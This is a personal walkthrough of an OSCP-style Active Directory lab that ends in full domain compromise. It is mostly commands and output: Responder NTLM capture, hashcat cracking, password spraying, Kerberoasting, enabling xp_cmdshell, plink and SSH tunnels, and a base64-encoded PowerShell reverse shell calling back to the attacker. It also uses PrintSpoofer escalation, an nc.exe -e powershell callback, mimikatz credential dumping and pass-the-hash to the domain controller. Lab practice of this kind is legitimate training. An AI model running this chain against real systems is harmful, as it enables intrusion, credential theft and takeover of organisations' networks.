# About this lab

This lab challenges learners to exploit exposed services and misconfigurations in an Active Directory environment. Starting with a Kerberoasting attack to crack service account credentials, learners perform lateral movement, configure SQL Server for command execution, and escalate privileges to NT AUTHORITY\SYSTEM using the SeImpersonatePrivilege. The exercise culminates in a domain compromise through hash extraction and reuse.

Username: Eric.Wallows
Password: EricLikesRunning800

Hosts:
- 10.10.89.146 - DC01
- 192.168.129.147 - MS01 (OS Credentials `Eric.Wallows / EricLikesRunning800`)
- 10.10.89.148 - MS02
---
# Portscan

```bash
TARGET="192.168.129.147"
sudo nmap -v -Pn -p- -T4 -oN "${TARGET}_ports.nmap" "$TARGET" && \
sudo nmap -v -Pn -p $(cat "${TARGET}_ports.nmap" | grep -Eo '([0-9]{1,5})/tcp' | awk -F '/' '{print $1}' | paste -sd ',') -sV -sC -oN "${TARGET}_services.nmap" "$TARGET"
```

# HTTP

Port 8000 => only IIS default page:
```
http://ms01:8000/
```

Ports 8080, 8443 => invalid hostname:
```
HTTP Error 400. The request hostname is invalid.
```

Works with FQDN on Port 8080:
```
http://ms01.oscp.exam:8080/
```
=> Partner Portal:
![[Pasted image 20251108161609.png]]

HTTP header:
```
X-AspNetMvc-Version: 5.2
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
```

# SMB

```bash
smbclient -N -L \\\\ms01\\
# session setup failed: NT_STATUS_ACCESS_DENIED

smbclient -L \\\\ms01\\ -U guest
# session setup failed: NT_STATUS_ACCOUNT_DISABLED

smbclient -L \\\\ms01\\ -U 'Eric.Wallows'%'EricLikesRunning800'
# session setup failed: NT_STATUS_LOGON_FAILURE
```

# FTP

```bash
netexec ftp ms01 -u 'Eric.Wallows' -p 'EricLikesRunning800'                      
# FTP         192.168.129.147 21     ms01             [-] Eric.Wallows:EricLikesRunning800 (Response:530 User cannot log in, home directory inaccessible.)
```
=> nope

# WinRM

```bash
evil-winrm -i ms01 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```

Users:
```
ls C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/25/2022   1:08 PM                Administrator
d-----        11/10/2022   2:06 AM                Administrator.OSCP
d-----          4/1/2022   9:30 AM                celia.almeda
d-----         11/8/2025   6:48 AM                DefaultAppPool
d-----         11/8/2025   7:38 AM                eric.wallows
d-----          4/1/2022   7:56 AM                Mary.Williams
d-r---        11/18/2020  11:48 PM                Public
d-----         12/1/2022   3:17 AM                support
d-----        11/13/2022  11:23 PM                web_svc


net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
Mary.Williams            support                  WDAGUtilityAccount
```

Local admins:
```
net localgroup Administrators

Members

-------------------------------------------------------------------------------
Administrator
OSCP\Domain Admins
```

# winPEAS

Results
```
Checking for SNMP Passwords
SNMP Key found at HKLM:\SYSTEM\CurrentControlSet\Services\SNMP
=> nope
...

Group: Remote Management Users
MS01\support
OSCP\eric.wallows
```

# Responder

```bash
sudo responder -I tun0 -v
```

From the Portal make a POST request to access the file "what" on our machine:
```http
POST /Home/Signup HTTP/1.1
Host: ms01.oscp.exam:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: http://ms01.oscp.exam:8080
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ms01.oscp.exam:8080/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=test&mail=OK%40ok.ok&url=file://192.168.45.174/what
```

Responder catches the NTLM hash of the SPN:
```
[SMB] NTLMv2-SSP Username : OSCP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::OSCP:22c885ec9e63f7ef:AA576D8E8F34D93175A0CC61EABE12C1:0101000000000000807DE723D250DC01497E3A814F7E8DE90000000002000800440036003700580001001E00570049004E002D004F005900540055003500330052004E0045004900430004003400570049004E002D004F005900540055003500330052004E004500490043002E0044003600370058002E004C004F00430041004C000300140044003600370058002E004C004F00430041004C000500140044003600370058002E004C004F00430041004C0007000800807DE723D250DC0106000400020000000800300030000000000000000000000000300000E2F988B6111100AC542B9889B821BABECB5CD8C54CA42431496D80A6811604980A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370034000000000000000000
```

Crack hash:
```bash
hashcat -m 5600 web_svc.ntlmv2.hash /usr/share/wordlists/rockyou.txt
# Success! PW: Diamond1
```

Remote access:
```bash
impacket-psexec web_svc:'Diamond1'@ms01
impacket-wmiexec web_svc:'Diamond1'@ms01
impacket-smbexec web_svc:'Diamond1'@ms01
```
=> All denied

---
# AD Enum

Setup ligolo...

## Enum Users

```bash
impacket-GetADUsers -all -dc-ip dc01 'oscp.exam/Eric.Wallows':'EricLikesRunning800' | awk '{print $1}'
```

## Password Spraying - "Diamond1"

SMB:
```bash
netexec smb ms01 dc01 ms02 -u ad_users.txt -p "Diamond1"
# Only oscp.exam\web_svc:Diamond1 on all host

netexec smb ms01 dc01 ms02 -u 'oscp.exam\web_svc' -p "Diamond1" --shares
# only read perm
```

MSSQL:
```bash
netexec mssql ms01 dc01 ms02 -u ad_users.txt -p "Diamond1"
# MSSQL       10.10.89.148    1433   MS02             [+] oscp.exam\web_svc:Diamond1

impacket-mssqlclient 'OSCP/web_svc':'Diamond1'@ms02 -windows-auth
```

MSSQL session:
```SQL
select name from sys.databases;
/* only default dbs */

SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
/* no read perm */

EXECUTE xp_cmdshell 'whoami';
/* ERROR(MS02\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'. */

EXECUTE sp_configure 'show advanced options', 1;
/* ERROR(MS02\SQLEXPRESS): Line 105: User does not have permission to perform this action. */

/* Try NTLM Auth Coersion */
EXEC MASTER.sys.xp_dirtree '\\192.168.45.174\test', 1, 1
/*
Doesn't work since MS02 is in the internal network, need to setup port forwarding on ms01 for this to work

Also cannot setup port 445 forwarding on MS01 since its already in use, and for IP forwarding local admin privs are required... 

looks like DEAD END
*/
```

## FTP

```bash
netexec ftp ms01 dc01 ms02 -u ad_users.txt -p "Diamond1"
# FTP         192.168.129.147 21     ms01             [+] web_svc:Diamond1

ftp web_svc@ms01
# Directory C:\inetpub
# We already could access this via winRM as eric
```

## SSH

```bash
netexec ssh ms01 dc01 ms02 -u ad_users.txt -p "Diamond1"
# SSH         192.168.129.147 22     ms01             [+] web_svc:Diamond1 (Pwn3d!) with UAC - Windows - Shell access!

ssh -v web_svc@ms01
```
=> BINGO!

# Kerberoasting

```bash
impacket-GetUserSPNs -request -dc-ip dc01 'oscp.exam/Eric.Wallows':'EricLikesRunning800' 
```
=> sql_svc and web_svc. we already have latter, lets crack the first one.

```bash
hashcat -m 13100 sql_svc.ntlmv2.hash /usr/share/wordlists/rockyou.txt
```
=> Dolphin1

## Password Spraying - "Dolphin1"

SMB:
```bash
netexec smb ms01 dc01 ms02 -u ad_users.txt -p "Dolphin1"
# oscp.exam\sql_svc:Dolphin1 an all hosts, nothing interesting(?)
```

MSSQL:
```bash
netexec mssql ms01 dc01 ms02 -u ad_users.txt -p "Dolphin1"
# MSSQL       10.10.89.148    1433   MS02             [+] oscp.exam\sql_svc:Dolphin1 (Pwn3d!)

impacket-mssqlclient 'OSCP/sql_svc':'Dolphin1'@ms02 -windows-auth
```

MSSQL session:
```SQL
select name from sys.databases;
/* only default dbs */

SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
/* BINGO! can read contents! */

EXECUTE xp_cmdshell 'whoami';
/* ... component is turned off ... lets turn it on then :) */

EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXECUTE xp_cmdshell 'whoami';
/* BINGO!!! */
/* nt service\mssql$sqlexpress */


EXECUTE xp_cmdshell 'where ssh';
/* C:\Windows\System32\OpenSSH\ssh.exe */
/* there is also a ssh binary on MS02 */
```

# Reverse Shell

In order to catch a reverse shell the listener needs to be executed on MS01 or we need to forward a port to our kali machine (which MS02 cannot access directly).

Since MS01 is running an SSH server and we have credentials (web_svc:Diamond1) and MS02 has a SSH client binary installed, we can use remote port forwarding to open a listening port (1337) on MS01 which forwards packet to kali on port 1338.

We can then run a netcat listener on kali port 1338 and make the reverse shell connect to MS01 on port 1337.

In MS02 MSSQL shell:
```SQL
/* ssh-exe -N -R <MS01-listen-port>:<kalihost>:<kaliport> web_svc@MS01 */
EXECUTE xp_cmdshell 'ssh.exe -N -R 1337:192.168.45.174:1338 web_svc@ms01';
```

On Kali:
```bash
nc -vlnp 1338
```

Note: This this not work, since SSH would prompt for a password, we need to create public/private keys for this to work.
NOTE!! This never worked in the first place as MS02 doesnt know the hostname "ms01", which was just setup in /etc/hosts in Kali :) We need to use the internal IP of MS01 instead.

Create keys on MS01, MS02:
```powershell
# Create keys on kali
ssh-keygen

# Download public key on MS01
iwr -uri http://192.168.45.174/id_ed25519.pub -outfile id_ed25519.pub
mkdir .ssh
echo "<public-key>" >> .ssh\authorized_keys
# Set permissions of .ssh and authorized_keys
icacls ".ssh" /inheritance:d /grant:r web_svc:F /grant SYSTEM:F  
icacls.exe ".ssh\authorized_keys" /inheritance:d /grant:r web_svc:F /grant SYSTEM:F 

# To get the private key on MS02 we use base64 encoding
cat id_ed25519 | base64 -w 0;echo

EXECUTE xp_cmdshell 'powershell.exe -ExecutionPolicy Bypass -Command "[IO.File]::WriteAllBytes(\"C:\Users\Public\id_ed25519", [Convert]::FromBase64String(\"LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNDZUxsVzFSdXhWam1MY0F0RjdDNnB2S3Z1dm9TZnkraEs4d0FOWUlOcWJNQUFBQUpCY21nM2lYSm9OCjRnQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQ2VMbFcxUnV4VmptTGNBdEY3QzZwdkt2dXZvU2Z5K2hLOHdBTllJTnFiTUEKQUFBRUJkUllieUlYR2J5YkFmRVh6VEczbkluY2JneGtKQm9lNW9IZ29BYklOVEZaNHVWYlZHN0ZXT1l0d0MwWHNMcW04cQorNitoSi9MNkVyekFBMWdnMnBzd0FBQUFDV3RoYkdsQWEyRnNhUUVDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K\"))"';

# Setup permissions of private key
EXECUTE xp_cmdshell 'icacls.exe C:\Users\Public\id_ed25519 /inheritance:d /grant:r sql_svc:F';
```

Lets try again with private key auth:
```SQL
/* ssh.exe -N -R <MS01-listen-port>:<kalihost>:<kaliport> web_svc@10.10.89.147 */
EXECUTE xp_cmdshell 'ssh.exe -N -R 1337:192.168.45.174:1338 web_svc@10.10.89.147 -i C:\Users\Public\id_ed25519';
```
=> This command blocks the shell ???

Try to detach the process:
```SQL
EXEC xp_cmdshell 'START "" ssh.exe -N -R 1337:192.168.45.174:1338 web_svc@10.10.89.147 -i C:\Users\Public\id_ed25519';
/* NOPE, still blcoks */

EXEC xp_cmdshell 'cmd /c "start /b ssh.exe -N -R 1337:192.168.45.174:1338 web_svc@10.10.89.147 -i C:\Users\Public\id_ed25519"';
/* NOPE, still blcoks */
```
=> Ok so then we simply use two MSSQL connections?

In the first connection make the SSH port forwarding stuff:
```SQL
/* ssh.exe -N -R <MS01-listen-port>:<kalihost>:<kaliport> web_svc@MS01 */
EXECUTE xp_cmdshell 'ssh.exe -N -R 1337:192.168.45.174:1338 web_svc@10.10.89.147 -i C:\Users\Public\id_ed25519';
```
In the second connection, run a reverse shell command:
```SQL
/* Second connection:
impacket-mssqlclient 'OSCP/sql_svc':'Dolphin1'@ms02 -windows-auth
*/

/*test connection*/
EXECUTE xp_cmdshell 'curl.exe http://192.168.45.174:1338/test';
```
NOPE

Testing the connection from kali shows that the SSH via private key never worked:
```bash
ssh -v web_svc@ms01 -i ./id_ed25519

debug1: Will attempt key: ./id_ed25519 ED25519 SHA256:q6z2x4eLbvK9BJ9yS79+rgWkuCVsdE04njwVdzHa6Xc explicit
debug1: Offering public key: ./id_ed25519 ED25519 SHA256:q6z2x4eLbvK9BJ9yS79+rgWkuCVsdE04njwVdzHa6Xc explicit
debug1: Authentications that can continue: publickey,password,keyboard-interactive
debug1: Next authentication method: keyboard-interactive
debug1: Authentications that can continue: publickey,password,keyboard-interactive
debug1: Next authentication method: password
```
=> GIVING UP ON THIS APPROACH :(

Next ideas:
1. Use plink on ms01 to port forward to kali
2. If above fails: upload netcat on MS01 and run the reverse shell listener there

# Plink

Start SSH server on kali:
```bash
sudo systemctl start ssh
```

On MS01 run ssh client and forward port 1337 to kali port 1338:
```Powershell
echo y | .\plink.exe -ssh -l tunneluser -pw "PY30OPY7SRNTPIqIF2gK5lrag8e" 192.168.45.174 "exit"

.\plink.exe -ssh -l tunneluser -pw "PY30OPY7SRNTPIqIF2gK5lrag8e" -L 10.10.89.147:1337:192.168.45.174:1338 192.168.45.174 -N
```
BWAM!
# Reverse Shell

Reverse shell to MS01:1337 -> forwarded to kali:1338:
```PowerShell
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("10.10.89.147",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
exit
```

On Kali:
```bash
nc -vlnp 1338
```

Execute on MS02:
```SQL
EXECUTE xp_cmdshell 'powershell.exe -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AOAA5AC4AMQA0ADcAIgAsADEAMwAzADcAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
```

BINGO!!
```bash
connect to [192.168.45.174] from (UNKNOWN) [192.168.45.174] 60104
whoami
nt service\mssql$sqlexpress
PS C:\Windows\system32>
```

# PrivEsc

```powershell
whoami /priv

# SeImpersonatePrivilege
```

Exit reverse shell, open python http server on port 1338 to upload PrintSpoofer64.exe to MS02 via the port forwarding on MS01:
```powershell
# On Kali
python3 -m http.server 1338

# On MS02 - MSSQL session
EXECUTE xp_cmdshell 'powershell.exe -ExecutionPolicy Bypass -Command "iwr -uri http://10.10.89.147:1337/PrintSpoofer64.exe -outfile C:\Users\Public\PrintSpoofer64.exe"';
```

Setup reverse shell again and run exploit on MS02:
```powershell
.\PrintSpoofer64.exe -i -c cmd
# Interactive shell fails

# Idea:
# Add oscp.exam\eric.wallows to local administrators and connect via winrm
.\PrintSpoofer64.exe -c "net localgroup Administrators oscp.exam\eric.wallows /add"

evil-winrm -i ms02 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```
BINGO!!!

# MIMI

As eric upload and exec mimi:
```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "log" "lsadump::sam" "exit"
```

Results:
```
User : Administrator
Hash NTLM: 507e8b20766f720619e9f33d73756b34
```
=> Mimikatz only worked once??? WTF

Lets try this then..

# Shell as SYSTEM

Stop and rerun reverse shell listener:
```bash
nc -vlnp 1338
```

In the evil-winRM session as eric upload nc.exe and run it via PrintSpoofer64:
```powershell
.\PrintSpoofer64.exe -c "nc.exe 10.10.89.147 1337 -e powershell"
```

BWAAAAAM!
```
connect to [192.168.45.174] from (UNKNOWN) [192.168.45.174] 37348
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> whoami
whoami
nt authority\system
```

Run Mimi again:
```powershell
.\mimikatz.exe
# privilege::debug
# sekurlsa::logonpasswords
```

Results:
```
Username : Administrator
* Domain   : OSCP
* NTLM     : 59b280ba707d22e3ef0aa587fc29ffe5
  
* Username : MS02$
* Domain   : OSCP
* NTLM     : 5804e690cb323f4590c1974104662f1e
```
=> Domain Admin NTLM Hash BWAM :D

# Connect to DC as DA

```bash
evil-winrm -i dc01 -u 'oscp.exam\Administrator' -H '59b280ba707d22e3ef0aa587fc29ffe5'
```

```powershell
whoami
oscp\administrator

ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.89.146
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.89.254
```

GG!